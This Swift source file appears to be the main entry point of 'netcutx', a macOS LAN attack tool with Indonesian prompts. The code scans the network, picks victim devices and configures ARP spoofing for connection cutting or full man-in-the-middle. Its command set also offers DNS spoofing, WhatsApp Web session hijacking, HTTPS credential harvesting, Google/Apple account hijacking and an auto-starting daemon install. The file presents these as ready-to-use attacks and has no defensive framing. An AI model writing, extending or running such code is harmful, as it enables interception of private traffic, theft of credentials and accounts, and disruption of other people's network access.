import Foundation

func usage() {
    print("""
    netcutx - LAN Access Control Tool

    Usage:
      sudo netcutx                        Interactive mode
      sudo netcutx <victim-ip> [options]  CLI mode (spoof)
      sudo netcutx monitor [target-ip] [--detect-wa]  Passive traffic capture
      sudo netcutx fingerprint <target>   OS fingerprint device
      sudo netcutx dns-spoof <target> <domain>=<ip>  MITM + DNS spoof
      sudo netcutx redirect start <target> [--port 8080] [--interface en0] [--mitmproxy]  HTTP redirect
      sudo netcutx redirect stop                      Remove redirect rules
      sudo netcutx redirect status                    Show pf rules
      sudo netcutx wa-hijack <target>                 WhatsApp Web session hijack
      sudo netcutx cred-harvest <target>              HTTPS credential harvester
      sudo netcutx cloud-extract <target>             Hijack Google/Apple + backup guide
      sudo netcutx image-harvest <target>             Passive HTTP image capture
      sudo netcutx install                Install as system daemon (auto-start)
      sudo netcutx uninstall              Remove system daemon
      sudo netcutx stop all               Stop active spoofing
      sudo netcutx close                  Kill all netcutx + cleanup everything
      sudo netcutx status                 Show daemon status

    Spoof options:
      -i, --interface <name>  Network interface (default: auto)
      -g, --gateway <ip>      Gateway IP (default: auto)
      -r, --repeat <secs>     Spoof interval in seconds (default: 2)
      -b, --bidirectional     Spoof both victim and gateway (full MITM)
      -f, --forward           Enable IP forwarding
      -v, --verbose           Verbose output
      --help                  Show this help

    Examples:
      sudo netcutx
      sudo netcutx 192.168.1.100 -b -f
      sudo netcutx monitor 192.168.1.100
      sudo netcutx fingerprint 192.168.1.100
      sudo netcutx dns-spoof 192.168.1.100 web.whatsapp.com=192.168.1.12
      sudo netcutx redirect start 192.168.1.100
      sudo netcutx redirect stop
      sudo netcutx install
      sudo netcutx stop all
    """)
}

func main() {
    let args = CommandLine.arguments
    if args.contains("--help") {
        usage()
        return
    }

    // Daemon subcommands
    if args.count >= 2 {
        switch args[1] {
        case "install":
            installDaemon()
            return
        case "uninstall":
            uninstallDaemon()
            return
        case "status":
            daemonStatus()
            return
        case "stop":
            if args.count >= 3 && args[2] == "all" {
                stopAll()
            } else {
                print("Usage: netcutx stop all")
            }
            return
        case "close", "cleanup":
            closeAll()
            return
        case "upgrade":
            upgradeDaemon()
            return
        case "monitor":
            let rest = Array(args.dropFirst(2))
            var targetIP: String?
            var detectWA = false
            for arg in rest {
                if arg == "--detect-wa" || arg == "--wa" { detectWA = true }
                else if !arg.hasPrefix("-") { targetIP = arg }
            }
            standaloneCapture(targetIP: targetIP, detectWA: detectWA)
            return
        case "fingerprint":
            let positional = args.dropFirst(2).filter { !$0.hasPrefix("-") }
            guard let target = positional.first else {
                print("Usage: netcutx fingerprint <target-ip>")
                return
            }
            standaloneFingerprint(targetIP: target)
            return
        case "wa-hijack":
            let positional = args.dropFirst(2).filter { !$0.hasPrefix("-") }
            guard let target = positional.first else {
                print("Usage: netcutx wa-hijack <target-ip> [--interface en0]")
                return
            }
            waSessionHijack(targetIP: target)
            return
        case "cred-harvest", "credharvest":
            let positional = args.dropFirst(2).filter { !$0.hasPrefix("-") }
            guard let target = positional.first else {
                print("Usage: netcutx cred-harvest <target-ip> [--interface en0]")
                return
            }
            credHarvester(targetIP: target)
            return
        case "cloud-extract", "backup":
            let positional = args.dropFirst(2).filter { !$0.hasPrefix("-") }
            guard let target = positional.first else {
                print("Usage: netcutx cloud-extract <target-ip> [--interface en0]")
                return
            }
            cloudExtract(targetIP: target)
            return
        case "image-harvest", "images":
            let rest = Array(args.dropFirst(2))
            var targetIP: String?
            for arg in rest {
                if !arg.hasPrefix("-") { targetIP = arg }
            }
            guard let target = targetIP else {
                print("Usage: netcutx image-harvest <target-ip>")
                return
            }
            standaloneCapture(targetIP: target, harvestImages: true)
            return
        case "dns-spoof":
            let rest = Array(args.dropFirst(2))
            guard rest.count >= 2 else {
                print("Usage: netcutx dns-spoof <target-ip> <domain>=<fake-ip> [<domain2>=<ip2>...]")
                return
            }
            let target = rest[0]
            var rules: [DNSRule] = []
            for pair in rest.dropFirst() {
                let parts = pair.split(separator: "=", maxSplits: 1).map(String.init)
                guard parts.count == 2 else {
                    print("Invalid format: \(pair). Use domain=ip")
                    return
                }
                rules.append(DNSRule(domain: parts[0], fakeIP: parts[1]))
            }
            standaloneDNSSpoof(targetIP: target, rules: rules)
            return
        case "redirect":
            guard args.count >= 3 else {
                print("Usage: netcutx redirect start|stop|status [options]")
                return
            }
            let sub = args[2]
            switch sub {
            case "start":
                let rest = Array(args.dropFirst(3))
                var targetIP: String?
                var proxyPort = 8080
                var iface: String?
                var launchProxy = false
                var i = 0
                while i < rest.count {
                    switch rest[i] {
                    case "--port": i += 1; if i < rest.count { proxyPort = Int(rest[i]) ?? 8080 }
                    case "--interface", "-i": i += 1; if i < rest.count { iface = rest[i] }
                    case "--mitmproxy": launchProxy = true
                    default:
                        if !rest[i].hasPrefix("-") { targetIP = rest[i] }
                    }
                    i += 1
                }
                guard let target = targetIP else {
                    print("Usage: netcutx redirect start <target-ip> [--port 8080] [--interface en0] [--mitmproxy]")
                    return
                }
                redirectStart(targetIP: target, proxyPort: proxyPort, interface: iface, launchProxy: launchProxy)
            case "stop":
                redirectStop()
            case "status":
                redirectStatus()
            default:
                print("Usage: netcutx redirect start|stop|status")
            }
            return
        case "--daemon":
            runDaemon()
            return
        default:
            break
        }
    }

    let positionalArgs = args.dropFirst().filter { !$0.hasPrefix("-") }
    if positionalArgs.isEmpty {
        interactiveMode()
        return
    }

    cliMode()
}

func interactiveMode() {
    showBanner()

    guard let ifname = selectInterface() else { return }
    ok("Interface \(ifname)")

    guard let ourIP = getInterfaceIP(ifname) else {
        fail("Tidak dapat mendeteksi IP interface \(ifname)")
        return
    }
    ok("IP \(ourIP)")

    guard let ourMAC = getInterfaceMAC(ifname) else {
        fail("Tidak dapat mendeteksi MAC address")
        return
    }
    ok("MAC \(macToString(ourMAC))")

    guard let gw = getGatewayIP() else {
        fail("Tidak dapat mendeteksi gateway")
        return
    }
    ok("Gateway \(gw)")

    let bpf: NetcutxBPF
    do {
        bpf = try NetcutxBPF(interface: ifname)
    } catch {
        fail("Buka BPF gagal: \(error.localizedDescription)")
        warn("Jalankan dengan sudo")
        return
    }
    defer { bpf.close() }

    ok("BPF siap")

    status("Mencari gateway MAC...")
    guard let gatewayMAC = try? resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: gw) else {
        fail("Tidak dapat resolve MAC gateway")
        return
    }
    ok("Gateway \(gw) = \(macToString(gatewayMAC))")

    status("Memindai jaringan...")
    let knownDevices = quickScanARPTable(gatewayIP: gw, ourIP: ourIP)
    if !knownDevices.isEmpty {
        ok("Ditemukan \(knownDevices.count) device dari ARP cache")
    }

    status("Scan aktif (deep)...")
    guard let scanResult = try? scanNetwork(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, gatewayIP: gw, ifname: ifname, deep: true) else {
        fail("Scan jaringan gagal")
        return
    }

    var allDevices = knownDevices
    for d in scanResult.devices {
        if !allDevices.contains(where: { $0.ip == d.ip }) {
            allDevices.append(d)
        }
    }

    let ourDevice = DeviceInfo(
        ip: ourIP, mac: macToString(ourMAC),
        hostname: resolveHostname(ourIP),
        isGateway: false, isSelf: true
    )

    if !allDevices.contains(where: { $0.ip == ourIP }) {
        allDevices.insert(ourDevice, at: 0)
    }

    let gatewayDevice = DeviceInfo(
        ip: gw, mac: macToString(gatewayMAC),
        hostname: resolveHostname(gw),
        isGateway: true, isSelf: false
    )

    if let existingGW = allDevices.firstIndex(where: { $0.isGateway }) {
        allDevices[existingGW] = gatewayDevice
    } else {
        allDevices.insert(gatewayDevice, at: 0)
    }

    let tableDevices = allDevices.filter { !$0.ip.hasSuffix(".255") && !$0.ip.hasSuffix(".0") }

    // OS fingerprint devices (batched parallel probes)
    var devicesWithOS = tableDevices
    if !devicesWithOS.filter({ !$0.isGateway && !$0.isSelf }).isEmpty {
        print("")
        fingerprintAllDevices(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, devices: &devicesWithOS)
    }

    guard let selectedIndices = showDeviceTableMulti(devicesWithOS) else { return }

    let targets = selectedIndices.map { devicesWithOS[$0] }

    for target in targets {
        if target.isGateway {
            warn("Target \(target.ip) adalah gateway — dilewati.")
        }
    }

    let validTargets = targets.filter { !$0.isGateway }
    if validTargets.isEmpty {
        warn("Tidak ada target valid.")
        return
    }

    print("")
    print(c(.dim, "  Mode:"))
    print(c(.dim, "  [1] Potong koneksi (standar + AP poison)"))
    print(c(.dim, "  [2] MITM penuh (bidirectional)"))
    print(c(.dim, "  Pilih [1/2]"), terminator: " ")
    let modeChoice = readLine() ?? ""
    let bidirectional = modeChoice == "2"
    let forwardTraffic = bidirectional

    var configs: [SpooferConfig] = []
    for target in validTargets {
        let targetMAC: MACAddr
        if let parsed = stringToMAC(target.mac), !isAllZeroMAC(parsed) {
            targetMAC = parsed
            ok("MAC \(target.ip) = \(macToString(targetMAC)) (dari scan)")
        } else {
            status("Resolve MAC \(target.ip)...")
            guard let resolved = try? resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: target.ip) else {
                fail("Tidak dapat resolve MAC \(target.ip) — dilewati")
                continue
            }
            targetMAC = resolved
            ok("\(target.ip) = \(macToString(targetMAC))")
        }

        configs.append(SpooferConfig(
            interface: ifname,
            victimIP: target.ip,
            gatewayIP: gw,
            ourMAC: ourMAC,
            ourIP: ourIP,
            victimMAC: targetMAC,
            gatewayMAC: gatewayMAC,
            interval: 0.3,
            bidirectional: bidirectional,
            forwardTraffic: forwardTraffic
        ))
    }

    if configs.isEmpty {
        warn("Tidak ada target yang dapat di-spoof.")
        return
    }

    guard confirmActionMulti(configs: configs) else {
        warn("Dibatalkan")
        return
    }

    do {
        try startMassSpoofing(configs: configs)
    } catch {
        fail("\(error.localizedDescription)")
    }
}

func cliMode() {
    let args = CommandLine.arguments
    var victimIP: String?
    var interface: String?
    var gatewayIP: String?
    var interval: TimeInterval = 2
    var bidirectional = false
    var forwardTraffic = false
    var verbose = false

    var i = 1
    while i < args.count {
        let arg = args[i]
        switch arg {
        case "-i", "--interface":
            i += 1
            guard i < args.count else { print("Missing interface name"); return }
            interface = args[i]
        case "-g", "--gateway":
            i += 1
            guard i < args.count else { print("Missing gateway IP"); return }
            gatewayIP = args[i]
        case "-r", "--repeat":
            i += 1
            guard i < args.count, let val = Double(args[i]) else {
                print("Invalid repeat interval"); return
            }
            interval = val
        case "-b", "--bidirectional":
            bidirectional = true
        case "-f", "--forward":
            forwardTraffic = true
        case "-v", "--verbose":
            verbose = true
        default:
            if !arg.hasPrefix("-") {
                victimIP = arg
            } else {
                print("Unknown option: \(arg)")
                usage()
                return
            }
        }
        i += 1
    }

    guard let victim = victimIP else {
        print("Error: victim IP required")
        usage()
        return
    }

    let ifname: String
    if let provided = interface {
        ifname = provided
    } else if let detected = getDefaultInterface() {
        ifname = detected
        if verbose { print("Interface: \(ifname)") }
    } else {
        print("Error: could not detect interface. Specify with -i")
        return
    }

    let gw: String
    if let provided = gatewayIP {
        gw = provided
    } else if let detected = getGatewayIP() {
        gw = detected
        if verbose { print("Gateway: \(gw)") }
    } else {
        print("Error: could not detect gateway. Specify with -g")
        return
    }

    guard let ourIP = getInterfaceIP(ifname) else {
        print("Error: could not get IP for interface \(ifname)")
        return
    }

    guard let ourMAC = getInterfaceMAC(ifname) else {
        print("Error: could not get MAC for interface \(ifname)")
        return
    }

    if verbose {
        print("Our IP: \(ourIP)")
        print("Our MAC: \(macToString(ourMAC))")
        print("Victim: \(victim)")
    }

    let bpf: NetcutxBPF
    do {
        bpf = try NetcutxBPF(interface: ifname)
    } catch {
        print("Error opening BPF: \(error.localizedDescription)")
        print("Try running with sudo")
        return
    }
    defer { bpf.close() }

    print("Resolving victim MAC...")
    let victimMAC: MACAddr
    if let cached = getMACFromARPTable(victim) {
        victimMAC = cached
        print("  \(victim) is-at \(macToString(victimMAC)) (ARP cache)")
    } else {
        do {
            victimMAC = try resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: victim)
        } catch {
            print("Error: \(error.localizedDescription)")
            return
        }
        print("  \(victim) is-at \(macToString(victimMAC))")
    }

    print("Resolving gateway MAC...")
    let gatewayMAC: MACAddr
    if let cached = getMACFromARPTable(gw) {
        gatewayMAC = cached
        print("  \(gw) is-at \(macToString(gatewayMAC)) (ARP cache)")
    } else {
        do {
            gatewayMAC = try resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: gw)
        } catch {
            print("Error: \(error.localizedDescription)")
            return
        }
        print("  \(gw) is-at \(macToString(gatewayMAC))")
    }

    let config = SpooferConfig(
        interface: ifname,
        victimIP: victim,
        gatewayIP: gw,
        ourMAC: ourMAC,
        ourIP: ourIP,
        victimMAC: victimMAC,
        gatewayMAC: gatewayMAC,
        interval: interval,
        bidirectional: bidirectional,
        forwardTraffic: forwardTraffic
    )

    do {
        try startSpoofing(config: config)
    } catch {
        print("Spoof error: \(error.localizedDescription)")
    }
}

func getDefaultInterface() -> String? {
    let task = Process()
    task.executableURL = URL(fileURLWithPath: "/sbin/route")
    task.arguments = ["-n", "get", "default"]
    let out = Pipe()
    task.standardOutput = out
    guard (try? task.run()) != nil else { return nil }
    task.waitUntilExit()
    let data = out.fileHandleForReading.readDataToEndOfFile()
    guard let output = String(data: data, encoding: .utf8) else { return nil }
    for line in output.components(separatedBy: "\n") {
        let trimmed = line.trimmingCharacters(in: .whitespaces)
        if trimmed.hasPrefix("interface:") {
            return trimmed.components(separatedBy: " ").last?.trimmingCharacters(in: .whitespaces)
        }
    }
    return nil
}

func getInterfaceMAC(_ ifname: String) -> MACAddr? {
    let task = Process()
    task.executableURL = URL(fileURLWithPath: "/sbin/ifconfig")
    task.arguments = [ifname]
    let out = Pipe()
    task.standardOutput = out
    guard (try? task.run()) != nil else { return nil }
    task.waitUntilExit()
    let data = out.fileHandleForReading.readDataToEndOfFile()
    guard let output = String(data: data, encoding: .utf8) else { return nil }
    for line in output.components(separatedBy: "\n") {
        let trimmed = line.trimmingCharacters(in: .whitespaces)
        if trimmed.hasPrefix("ether ") {
            let macStr = trimmed.replacingOccurrences(of: "ether ", with: "").trimmingCharacters(in: .whitespaces)
            return stringToMAC(macStr)
        }
    }
    return nil
}

main()
